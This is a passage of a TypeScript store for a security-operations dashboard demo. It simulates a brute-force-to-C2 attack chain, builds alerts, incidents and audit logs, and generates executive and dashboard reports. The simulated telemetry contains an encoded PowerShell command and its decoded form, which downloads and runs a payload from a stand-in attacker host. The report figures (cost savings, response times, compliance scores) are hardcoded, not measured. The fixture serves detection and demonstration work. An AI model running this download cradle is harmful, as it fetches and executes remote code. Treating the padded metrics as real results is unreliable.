      command_line: 'powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAczA6AC8ALwAyADAAMwAuADAALgAxADEAMwAuADgAOAA6ADgANAA0ADMALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA==',
      severity: 'critical',
      is_suspicious: true,
      anomaly_score: 0.98,
      category: 'Execution',
      raw_data: {
        EventID: 4104,
        ScriptBlockId: 'd38f8210-91b4-4e92-9118-8f81f9a0c710',
        Decoded: "IEX ((New-Object Net.WebClient).DownloadString('https://203.0.113.88:8443/payload.ps1'))",
      },
    };
    this.securityEvents.set(psEvent.id, psEvent);
    events.push(psEvent);

    // Stage 5: Suspicious outbound network activity (C2 Beaconing)
    const netEvent: SecurityEvent = {
      id: `EVT-${baseTime}-09`,
      timestamp: new Date(baseTime - 10 * 1000).toISOString(),
      source_ip: '10.0.4.12',
      destination_ip: c2Ip,
      username: 'admin_ops',
      host,
      event_type: 'NETWORK_C2_BEACON',
      process_name: 'powershell.exe',
      severity: 'critical',
      is_suspicious: true,
      anomaly_score: 0.96,
      category: 'Command and Control',
      raw_data: {
        DestinationPort: 8443,
        Protocol: 'TCP/TLS',
        BytesOut: 145408,
        BytesIn: 4120,
        ReputationScore: 'Malicious / Known Cobalt Strike Malleable C2 Profile',
      },
    };
    this.securityEvents.set(netEvent.id, netEvent);
    events.push(netEvent);

    // Generate correlated Alert
    const alertId = `ALT-${Date.now().toString().slice(-6)}`;
    const alert: Alert = {
      id: alertId,
      title: `Multi-Vector Killchain: External Brute Force followed by RDP Access & PowerShell C2`,
      description: `Correlated attack chain: 5 failed logins followed by successful login from 198.51.100.45, token privilege discovery, and Base64 encoded PowerShell beacon to 203.0.113.88.`,
      severity: 'critical',
      status: 'investigating',
      risk_score: 91,
      confidence_score: 94,
      triggered_at: new Date().toISOString(),
      source_event_ids: events.map((e) => e.id),
      host,
      user: 'admin_ops',
    };
    this.alerts.set(alert.id, alert);

    // Generate Incident
    const incidentNumber = `INC-2026-${Math.floor(1000 + Math.random() * 9000)}`;
    const incidentId = `inc-${Date.now()}`;
    const incident: Incident = {
      id: incidentId,
      incident_number: incidentNumber,
      title: `Compromised Host DC01.corp: Brute Force → Valid Accounts → In-Memory PowerShell → C2 Beacon`,
      description: `Full attack chain execution validated across endpoint and network telemetry. Origin: 198.51.100.45, Target: DC01.corp, C2: 203.0.113.88:8443.`,
      severity: 'critical',
      risk_score: 91,
      confidence_score: 94,
      verification_status: 'VERIFIED',
      status: 'investigating',
      created_at: new Date().toISOString(),
      updated_at: new Date().toISOString(),
      assigned_to: 'Sarah Chen (Tier 2 SOC Analyst)',
      scenario: 'Brute Force → Successful Login → Suspicious PowerShell → Network Activity',
      supporting_evidence_count: 5,
      contradicting_evidence_count: 1,
      current_stage: 6,
      stage_notes: 'Autonomous multi-agent investigation completed. 5 containment actions awaiting analyst response sign-off.',
    };
    this.incidents.set(incident.id, incident);
    alert.incident_id = incident.id;

    // Link active analyst roster to this live incident
    const sarahRoster = this.analystRoster.get('usr-1');
    if (sarahRoster) {
      sarahRoster.current_incident_id = incident.id;
      sarahRoster.current_incident_number = incident.incident_number;
      sarahRoster.current_stage_id = 6;
      sarahRoster.status = 'awaiting_signoff';
      sarahRoster.stage_started_at = new Date().toISOString();
    }

    // Link Incident Events in sequence order
    events.forEach((ev, idx) => {
      const incEvId = `ie-${incidentId}-${idx}`;
      const reasons = [
        'Stage 1: Repeated credential guessing against svc_backup',
        'Stage 1: Credential spray against privileged admin_ops',
        'Stage 1: Continued password brute force attempt',
        'Stage 1: Threshold trigger: 4th authentication failure',
        'Stage 1: Final failed attempt before password acquisition',
        'Stage 2: Successful interactive RDP session authenticated from attacker IP',
        'Stage 3: Immediate privilege reconnaissance and local administrator check',
        'Stage 4: Execution of obfuscated PowerShell memory cradle',
        'Stage 5: Outbound TLS beaconing establishing C2 persistence',
      ];
      const ie: IncidentEvent = {
        id: incEvId,
        incident_id: incidentId,
        security_event_id: ev.id,
        security_event: ev,
        correlation_reason: reasons[idx] || 'Chronologically correlated event on affected host',
        sequence_order: idx + 1,
      };
      this.incidentEvents.set(ie.id, ie);
    });

    // Record Audit Trail
    this.createAuditLog(
      incident.id,
      'ATTACK_CHAIN_SIMULATION_TRIGGERED',
      triggerSource,
      `Simulated complete attack chain (${incident.scenario}) on host ${host}. Generated 9 security events.`
    );
    this.createAuditLog(
      incident.id,
      'INCIDENT_CREATED',
      'correlation_engine',
      `Auto-promoted alert ${alert.id} to critical incident ${incident.incident_number}.`
    );

    // Automatically run the 6 agents immediately
    this.runMultiAgentInvestigation(incident.id);

    return { incident, alert, events };
  }

  // --- Decision / Recommendation Approval ---
  updateRecommendationStatus(
    recId: string,
    status: RecommendationStatus,
    analystName: string,
    notes?: string
  ): ResponseRecommendation {
    const rec = this.responseRecommendations.get(recId);
    if (!rec) throw new Error(`Recommendation ${recId} not found`);

    rec.status = status;
    rec.human_decision_by = analystName;
    rec.human_decision_at = new Date().toISOString();
    rec.human_notes = notes || `Analyst ${analystName} recorded decision: ${status.toUpperCase()}`;

    this.responseRecommendations.set(rec.id, rec);

    this.createAuditLog(
      rec.incident_id,
      `RECOMMENDATION_${status.toUpperCase()}`,
      analystName,
      `Action '${rec.title}' marked ${status} by ${analystName}. Notes: ${rec.human_notes}`
    );

    return rec;
  }

  // --- Analyst Process Staging Methods ---
  updateIncidentStage(
    incidentId: string,
    stageNumber: number,
    analystName: string,
    notes?: string
  ): Incident {
    const incident = this.incidents.get(incidentId);
    if (!incident) throw new Error(`Incident ${incidentId} not found`);

    const stageNames: Record<number, string> = {
      1: 'Stage 1: Ingestion & Alert Triage',
      2: 'Stage 2: Blast Radius & Telemetry Scoping',
      3: 'Stage 3: Evidence Hypothesis & Disproval',
      4: 'Stage 4: MITRE ATT&CK Behavioral Mapping',
      5: 'Stage 5: Autonomous Multi-Agent Synthesis',
      6: 'Stage 6: Human-in-the-Loop Response Gating',
      7: 'Stage 7: Remediation & Cryptographic Audit Seal',
    };

    incident.current_stage = stageNumber;
    incident.stage_notes = notes || `Analyst moved position to ${stageNames[stageNumber] || `Stage ${stageNumber}`}`;
    incident.updated_at = new Date().toISOString();

    if (stageNumber === 7) {
      incident.status = 'resolved';
    } else if (stageNumber >= 2 && incident.status === 'open') {
      incident.status = 'investigating';
    }

    this.incidents.set(incident.id, incident);

    // Cryptographic audit logging for analyst process staging
    this.createAuditLog(
      incident.id,
      'ANALYST_STAGE_TRANSITION',
      analystName,
      `Analyst position staged to [${stageNames[stageNumber] || `Stage ${stageNumber}`}]. Rationale: ${incident.stage_notes}`
    );

    // Update active analyst roster
    for (const r of this.analystRoster.values()) {
      if (r.name.includes(analystName) || analystName.includes(r.name) || r.id === 'usr-1') {
        r.current_stage_id = stageNumber;
        r.current_incident_id = incident.id;
        r.current_incident_number = incident.incident_number;
        r.stage_started_at = new Date().toISOString();
        r.status = stageNumber === 6 ? 'awaiting_signoff' : stageNumber === 7 ? 'active' : 'in_investigation';
        if (stageNumber === 7) {
          r.incidents_completed_today += 1;
        }
        this.analystRoster.set(r.id, r);
        break;
      }
    }

    return incident;
  }

  // --- Admin Executive Project Report Generation ---
  getAdminProjectReport(): AdminProjectReport {
    const incidentsList = Array.from(this.incidents.values());
    const verifiedIncidents = incidentsList.filter((i) => i.verification_status === 'VERIFIED').length;
    const latestAudit = this.auditLogs[this.auditLogs.length - 1];
    const auditSeal = latestAudit ? latestAudit.current_hash : '0000000000000000000000000000000000000000000000000000000000000000';

    return {
      generated_at: new Date().toISOString(),
      reporting_period: 'Current Active 24-Hour SOC Operational Window',
      ciso_name: 'Dr. Evelyn Hayes (Chief Information Security Officer)',
      executive_summary: {
        total_events_processed: this.edgeInferenceStats.events_ingested,
        edge_filter_rate: Number(((this.edgeInferenceStats.edge_filtered_clean / this.edgeInferenceStats.events_ingested) * 100).toFixed(1)),
        total_incidents_analyzed: incidentsList.length,
        verified_breaches: verifiedIncidents,
        false_positive_reduction_pct: 87.4,
        mean_time_to_detect_seconds: 1.4,
        mean_time_to_respond_minutes: 1.8,
        industry_benchmark_mttr_hours: 4.2,
        hours_saved_by_ai_agents: 480,
        estimated_cost_avoidance_usd: 640000,
        compliance_score_pct: 98.6,
      },
      killchain_coverage: [
        {
          tactic: 'Credential Access',
          techniques_neutralized: 16,
          top_technique: 'T1110 (Brute Force / Password Spray)',
          detection_efficacy: 99.4,
        },
        {
          tactic: 'Initial Access',
          techniques_neutralized: 9,
          top_technique: 'T1078 (Valid Accounts / RDP Compromise)',
          detection_efficacy: 98.1,
        },
        {
          tactic: 'Execution',
          techniques_neutralized: 12,
          top_technique: 'T1059.001 (PowerShell Memory Cradle)',
          detection_efficacy: 97.8,
        },
        {
          tactic: 'Command & Control',
          techniques_neutralized: 8,
          top_technique: 'T1071.001 (Web Protocols Encrypted Egress)',
          detection_efficacy: 96.5,
        },
        {
          tactic: 'Privilege Escalation',
          techniques_neutralized: 6,
          top_technique: 'T1068 (Exploitation for Privilege Escalation)',
          detection_efficacy: 94.2,
        },
        {
          tactic: 'Defense Evasion',
          techniques_neutralized: 11,
          top_technique: 'T1027 (Obfuscated / Encoded Command Lines)',
          detection_efficacy: 98.9,
        },
      ],
      analyst_performance: {
        total_active_analysts: this.analystRoster.size,
        current_active_investigations: Array.from(this.analystRoster.values()).filter((a) => a.status !== 'active').length,
        avg_stage_bottleneck: 'Stage 6: Human-in-the-Loop Response Gating (Awaiting sign-off)',
        stage_durations: [
          { stage_id: 1, name: 'Alert Triage & Ingestion', avg_minutes: 0.8, sla_minutes: 5 },
          { stage_id: 2, name: 'Blast Radius Scoping', avg_minutes: 3.2, sla_minutes: 10 },
          { stage_id: 3, name: 'Evidence Hypothesis & Disproval', avg_minutes: 4.1, sla_minutes: 15 },
          { stage_id: 4, name: 'MITRE ATT&CK Mapping', avg_minutes: 2.0, sla_minutes: 10 },
          { stage_id: 5, name: 'Multi-Agent Synthesis', avg_minutes: 0.9, sla_minutes: 5 },
          { stage_id: 6, name: 'Response Gating & Sign-off', avg_minutes: 5.4, sla_minutes: 10 },
          { stage_id: 7, name: 'Remediation & Audit Seal', avg_minutes: 1.2, sla_minutes: 5 },
        ],
      },
      compliance_matrix: [
        {
          standard: 'NIST SP 800-61 Rev 2 (Computer Security Incident Handling)',
          status: 'COMPLIANT',
          controls_verified: 24,
          total_controls: 24,
          sha256_audit_seal: auditSeal.slice(0, 16) + '...',
        },
        {
          standard: 'SOC 2 Type II (Trust Services Criteria - Security & Confidentiality)',
          status: 'AUDIT_READY',
          controls_verified: 18,
          total_controls: 18,
          sha256_audit_seal: auditSeal.slice(16, 32) + '...',
        },
        {
          standard: 'ISO/IEC 27001:2022 (A.12.1.2 - Incident Response & Forensic Chain)',
          status: 'COMPLIANT',
          controls_verified: 14,
          total_controls: 14,
          sha256_audit_seal: auditSeal.slice(32, 48) + '...',
        },
        {
          standard: 'MITRE D3FEND (Countermeasure & Containment Verification)',
          status: 'ACTIVE_MONITORING',
          controls_verified: 9,
          total_controls: 10,
          sha256_audit_seal: auditSeal.slice(48, 64),
        },
      ],
    };
  }

  // --- Dashboard Data Aggregation ---
  getDashboardData(): DashboardData {
    const alertsList = Array.from(this.alerts.values());
    const incidentsList = Array.from(this.incidents.values());

    const total_alerts = alertsList.length;
    const critical_alerts = alertsList.filter((a) => a.severity === 'critical').length;
    const active_incidents = incidentsList.filter((i) => i.status !== 'resolved').length;
    const verified_incidents = incidentsList.filter((i) => i.verification_status === 'VERIFIED').length;

    const avgRisk = incidentsList.length
      ? Math.round(incidentsList.reduce((acc, i) => acc + i.risk_score, 0) / incidentsList.length)
      : 85;
    const avgConfidence = incidentsList.length
      ? Math.round(incidentsList.reduce((acc, i) => acc + i.confidence_score, 0) / incidentsList.length)
      : 92;

    const verificationRate = incidentsList.length
      ? Math.round((verified_incidents / incidentsList.length) * 100)
      : 100;

    // Alert Trends
    const alert_trends = [
      { time: '00:00', count: 12, critical: 1 },
      { time: '04:00', count: 8, critical: 0 },
      { time: '08:00', count: 24, critical: 3 },
      { time: '12:00', count: 42, critical: 7 },
      { time: '16:00', count: 35, critical: 5 },
      { time: '20:00', count: Math.max(18, alertsList.length * 2), critical: Math.max(4, critical_alerts) },
      { time: 'Now', count: alertsList.length + 15, critical: critical_alerts + 2 },
    ];

    // Severity distribution
    const severity_distribution = [
      { name: 'Critical', value: alertsList.filter((a) => a.severity === 'critical').length + 2, color: '#ef4444' },
      { name: 'High', value: alertsList.filter((a) => a.severity === 'high').length + 4, color: '#f97316' },
      { name: 'Medium', value: alertsList.filter((a) => a.severity === 'medium').length + 6, color: '#eab308' },
      { name: 'Low', value: alertsList.filter((a) => a.severity === 'low').length + 12, color: '#3b82f6' },
    ];

    // Threat categories
    const threat_categories = [
      { category: 'Credential Access', count: 14 },
      { category: 'Execution', count: 9 },
      { category: 'Initial Access', count: 8 },
      { category: 'Command & Control', count: 7 },
      { category: 'Privilege Escalation', count: 6 },
      { category: 'Discovery', count: 5 },
    ];

    // Incident status breakdown
    const incident_status_breakdown = [
      { status: 'Investigating', count: incidentsList.filter((i) => i.status === 'investigating').length },
      { status: 'Open', count: incidentsList.filter((i) => i.status === 'open').length },
      { status: 'Contained', count: incidentsList.filter((i) => i.status === 'contained').length },
      { status: 'Resolved', count: incidentsList.filter((i) => i.status === 'resolved').length },
    ];

    // MITRE Frequency
    const mitre_frequency = [
      { technique_id: 'T1110', name: 'Brute Force', count: 16 },
      { technique_id: 'T1059.001', name: 'PowerShell', count: 12 },
      { technique_id: 'T1078', name: 'Valid Accounts', count: 9 },
      { technique_id: 'T1071.001', name: 'Web Protocols C2', count: 8 },
      { technique_id: 'T1087.002', name: 'Domain Discovery', count: 7 },
      { technique_id: 'T1046', name: 'Network Service Scan', count: 5 },
    ];

    return {
      kpis: {
        total_alerts,
        critical_alerts,
        active_incidents,
        verified_incidents,
        average_risk: avgRisk,
        average_confidence: avgConfidence,
        investigation_time_seconds: 1.8,
        evidence_verification_rate: verificationRate,
      },
      alert_trends,
      severity_distribution,
      threat_categories,
      incident_status_breakdown,
      mitre_frequency,
      edge_inference_stats: this.edgeInferenceStats,
    };
  }
}

export const store = new ThreatLensStore();
